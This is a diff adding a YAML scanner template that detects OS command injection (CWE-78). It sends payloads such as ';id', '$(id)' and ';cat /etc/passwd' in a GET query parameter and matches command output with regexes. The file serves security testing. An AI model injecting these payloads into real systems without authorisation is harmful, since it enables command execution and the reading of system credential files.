@@ -1,0 +1,53 @@
+id: cmdi-basic
+name: OS Command Injection
+severity: critical
+vulnerability_type: cmdi
+owasp: "A03:2021 Injection"
+cwe: CWE-78
+description: Detects command injection via common OS command payloads
+tags: [cmdi, rce, injection]
+
+payloads:
+  - ";id"
+  - "|id"
+  - "&&id"
+  - "$(id)"
+  - "`id`"
+  - ";whoami"
+  - "|whoami"
+  - "&&whoami"
+  - ";cat /etc/passwd"
+  - "|cat /etc/passwd"
+  - ";uname -a"
+  - "|uname -a"
+  - ";ping -c 1 127.0.0.1"
+  - "&& dir C:\\"
+
+request:
+  method: GET
+  inject_in: query
+
+matchers:
+  - type: regex
+    value: "uid=\\d+\\(\\w+\\)\\s+gid=\\d+"
+    part: body
+  - type: regex
+    value: "\\b(?:root|www-data|apache|nginx|nobody)\\b"
+    part: body
+  - type: word
+    value: "root:x:0:0"
+    part: body
+  - type: regex
+    value: "Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+"
+    part: body
+  - type: regex
+    value: "Directory of [A-Z]:\\\\"
+    part: body
+  - type: regex
+    value: "\\d+ bytes free"
+    part: body
+  - type: word
+    value: "PING 127.0.0.1"
+    part: body
+
+match_condition: or
